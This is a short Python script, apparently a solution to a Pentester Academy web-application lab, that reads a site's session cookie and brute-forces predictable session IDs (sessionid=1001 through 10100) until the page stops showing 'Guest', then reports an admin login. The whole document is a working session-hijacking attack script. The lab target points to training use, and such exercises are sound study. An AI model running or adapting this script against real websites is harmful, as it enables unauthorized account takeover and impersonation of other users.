#!/usr/bin/python

import requests
import sys
from termcolor import colored

url_base = "http://pentesteracademylab.appspot.com/lab/webapp/sid/2"
print colored("[*]Request The URL and Search the Header For Cookie ... ","yellow")
print colored("[*]SessionID Analysis ... ","yellow") # sessionid=10xx

Login = requests.get(url_base)
Cookies = Login.headers.get('set-cookie').split('=')[1]

print colored("[*]Cookie Vlaue %s ... "%Cookies,"yellow")
print colored("[*]Set The Cookie Value = 10xx","yellow")

for Cookie in range(1,101):
	Custome_header = {'Cookie': "sessionid=10%s"%Cookie }
	Login = requests.get(url_base, headers = Custome_header)

	if Login.text.find("Guest") == -1:
		print colored("[*]Login as Admin with SessionID = 10%s ... Done !! " %Cookie,"green")
		sys.exit(0)
	
